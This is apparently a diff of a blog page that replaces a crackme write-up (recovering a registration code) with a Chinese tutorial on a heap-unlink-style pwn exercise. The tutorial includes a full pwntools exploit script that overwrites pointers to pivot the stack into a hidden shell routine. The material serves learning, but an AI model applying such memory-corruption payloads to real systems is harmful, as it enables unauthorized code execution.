@@ -6,26 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>看雪CTF-2016第六题Writeup | isee&#39;blog</title>
+  <title>一道unlink的pwn练习 | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="源程序：http://pan.baidu.com/s/1eSNu1sI">
+  <meta name="description" content="unlink">
 <meta property="og:type" content="article">
-<meta property="og:title" content="看雪CTF-2016第六题Writeup">
-<meta property="og:url" content="https://niwbie.github.io/2016/11/20/看雪CTF-2016第六题Writeup/index.html">
+<meta property="og:title" content="一道unlink的pwn练习">
+<meta property="og:url" content="https://niwbie.github.io/2016/04/09/一道unlink的pwn练习/index.html">
 <meta property="og:site_name" content="isee'blog">
-<meta property="og:description" content="源程序：http://pan.baidu.com/s/1eSNu1sI">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/1.png">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/2.png">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/3.png">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/4.png">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/5.png">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/6.png">
-<meta property="og:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/7.png">
-<meta property="og:updated_time" content="2016-11-20T05:31:50.102Z">
+<meta property="og:description" content="unlink">
+<meta property="og:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/3.png">
+<meta property="og:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/4.png">
+<meta property="og:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/5.png">
+<meta property="og:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/6.png">
+<meta property="og:updated_time" content="2017-04-09T11:16:18.279Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="看雪CTF-2016第六题Writeup">
-<meta name="twitter:description" content="源程序：http://pan.baidu.com/s/1eSNu1sI">
-<meta name="twitter:image" content="https://niwbie.github.io/image/看雪CTF2016第六题Writeup/1.png">
+<meta name="twitter:title" content="一道unlink的pwn练习">
+<meta name="twitter:description" content="unlink">
+<meta name="twitter:image" content="https://niwbie.github.io/image/一道unlink的pwn练习/1.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -141,7 +140,7 @@
 </nav>
 
       <div class="body-wrap">
-        <article id="post-看雪CTF-2016第六题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-一道unlink的pwn练习" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -151,7 +150,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      看雪CTF-2016第六题Writeup
+      一道unlink的pwn练习
     </h1>
   
       
@@ -159,31 +158,35 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>源程序：<a href="http://pan.baidu.com/s/1eSNu1sI" target="_blank" rel="external">http://pan.baidu.com/s/1eSNu1sI</a></p>
-<a id="more"></a>
-<p>先用peid查壳，什么都没查到。上ExeinfoPE，感觉是个E语言写的程序：<br>      <img src="/image/看雪CTF2016第六题Writeup/1.png" alt="这里写图片描述"></p>
-<p>打开，输入注册码，点击注册，程序就崩了。。。<br>   <img src="/image/看雪CTF2016第六题Writeup/2.png" alt="这里写图片描述"></p>
-<p>祭出神器E-Debug，找到注册按钮的处理函数：<br>   <img src="/image/看雪CTF2016第六题Writeup/3.png" alt="这里写图片描述"></p>
-<p>但是这一次神器失效了，用IDA打开什么也没找到。。。</p>
-<p>换一种方法，在IDA导入表中看到有GetWindowTextA函数，下断。这里有个要注意，因为本程序是循环不停调用GetWindowTextA，所以要在0x40115C处断下后在给GetWindowTextA下断：<br>   <img src="/image/看雪CTF2016第六题Writeup/4.png" alt="这里写图片描述"></p>
-<p>字符串存在了地址0xA44058处。</p>
-<p>查看后是在0x404e07处调用的类方法CWnd::GetWindowTextA，接着函数退回到0x414BB5处：<br>   <img src="/image/看雪CTF2016第六题Writeup/5.png" alt="这里写图片描述"></p>
-<p>给地址0xA44058下一个硬件断点，继续往下走，然后硬件断点断在了0x4103DC处。这个流程可以通过IDA查看，函数为sub_4026B0。处理完后跳到0x401910,将输入与字符串 “33053055C3055C2E3030553055C2”逐个比较。这个比较是在函数sub_40197F中进行的，调用了sub_4018E2进行比较，返回值赋给v19：<br>   <img src="/image/看雪CTF2016第六题Writeup/6.png" alt="这里写图片描述"></p>
-<p>在OD中进入v43==1 的这个分支，发现push了一个注册成功的参数：<br>   <img src="/image/看雪CTF2016第六题Writeup/7.png" alt="这里写图片描述"></p>
-<p>直接F9，发现打印注册成功。看来这里只是将输入与字符串”33053055C3055C2E3030553055C2”进行比较 。那么这个字符串就是要找的注册码了。</p>
-<p>整个流程为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">sub_40197F()&#123;</div><div class="line">	sub_40234A()&#123;</div><div class="line">		sub_402810()&#123;</div><div class="line">			4026B0()&#123;</div><div class="line">				4103D0()&#123;</div><div class="line">					处理输入的注册码</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	  v19 = sub_4018E2(v18, (int)v47) == 0;</div><div class="line">	 if(v19)</div><div class="line">		注册成功！</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+        <p><a href="/image/一道unlink的pwn练习/unlink">unlink</a><br><a id="more"></a><br>这是一道类似unlink程序的题目，通过完成这道练习加深对unlink的理解。</p>
+<p>程序部分通过指针的操作模拟unlink：<br><img src="/image/一道unlink的pwn练习/1.png" alt="这里写图片描述"><br><img src="/image/一道unlink的pwn练习/2.png" alt="这里写图片描述"></p>
+<p>gets之前的数据结构为：<br><img src="/image/一道unlink的pwn练习/3.png" alt="这里写图片描述"></p>
+<p>其中:<br>v4 = 0x804b410<br>v5 = 0x804b440<br>v6 = 0x804b428</p>
+<p>而unlink函数的操作类似为：(P为指针v6)</p>
+<p>p-&gt;fd-&gt;bk = p-&gt;bk<br>p-&gt;bk-&gt;fd = p-&gt;fd</p>
+<p>我们直接跳到payload部分来解释这一段，比如在gets中，我们输入这样的一段payload:</p>
+<p>shell_addr = 0x80484eb<br>p.sendline(‘A’*16 + p32(heap_addr+0x24) + p32(stack_addr+0x10) + p32(shell_addr))<br>这样，上图中的数据变为：<br><img src="/image/一道unlink的pwn练习/4.png" alt="这里写图片描述"></p>
+<p>如上图所示，经过unlink函数时，会进行这样的操作：</p>
+<p>[0x804b434+4] = 0xffffd0c4, 即上面的0x804b438中的值变为0xffffd0c4<br>[0xffffd0c4] = 0x804b434,    即0xffffd0c4中的值变为0x804b434</p>
+<p>然后我们再来看main函数中的最后一段汇编代码：<br><img src="/image/一道unlink的pwn练习/5.png" alt="这里写图片描述"></p>
+<p>先是mov ecx, [ebp-4]  #调试的时候看出来的是[ebp-0x4]</p>
+<p>其实0xffffd0c4是我们精心构造的，其实就是ebp-4就是我们的0xffffd0c4,所以此时ecx = [0xffffd0c4] = 0x804b434</p>
+<p>然后lea esp, [ecx-4]<br>即esp = 0x804b430,就是藏在程序中的shellcode的地址：<br><img src="/image/一道unlink的pwn练习/6.png" alt="这里写图片描述"></p>
+<p>ret之后就获得了shell。</p>
+<p>其实中间遇到过一个问题：为什么要这么绕呢，为什么不能直接将FD-&gt;bk替换成shellcode地址呢？<br>这是因为unlink需要经过两个步骤，如果只考虑FD-&gt;bk替换，那么BK-&gt;fd替换时，有可能造成BK-&gt;fd为text段不可写，所以使用这种迂回的办法。</p>
+<p>完整pwn：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">p = process(&apos;./unlink&apos;)</div><div class="line"></div><div class="line">line1=p.readline().strip()</div><div class="line">line2=p.readline().strip()</div><div class="line">stack_addr = int(line1.split(&apos;: 0x&apos;)[1], 16)</div><div class="line">heap_addr = int(line2.split(&apos;: 0x&apos;)[1], 16)</div><div class="line">shell_addr = 0x080484eb</div><div class="line"></div><div class="line">print hex(stack_addr)</div><div class="line">print hex(heap_addr)</div><div class="line"> </div><div class="line">gdb.attach(proc.pidof(p)[0], &apos;b *0x80485e9&apos;)</div><div class="line">p.sendline(&apos;A&apos;*16 + p32(heap_addr+0x24) + p32(stack_addr+0x10) + p32(shell_addr))</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
 
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/11/20/看雪CTF-2016第六题Writeup/" class="archive-article-date">
-  	<time datetime="2016-11-20T05:26:38.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-20</time>
+      <a href="/2016/04/09/一道unlink的pwn练习/" class="archive-article-date">
+  	<time datetime="2016-04-09T11:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-04-09</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
@@ -196,18 +199,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/11/20/看雪CrackMe第三题之去除花指令/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          看雪CTF-2016第三题之去除花指令
+          简单的分配栈帧及溢出修改相邻变量
         
       </div>
     </a>
   
   
-    <a href="/2016/11/19/看雪CTF-2016第五题Writeup/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">看雪CTF 2016第五题Writeup(附RC4算法)</div>
+    <a href="/2016/04/09/堆溢出的unlink利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">堆溢出的unlink利用</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -241,7 +244,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="看雪CTF-2016第六题Writeup" data-title="看雪CTF-2016第六题Writeup" data-url="https://niwbie.github.io/2016/11/20/看雪CTF-2016第六题Writeup/"></div>
+	<div class="ds-thread" data-thread-key="一道unlink的pwn练习" data-title="一道unlink的pwn练习" data-url="https://niwbie.github.io/2016/04/09/一道unlink的pwn练习/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
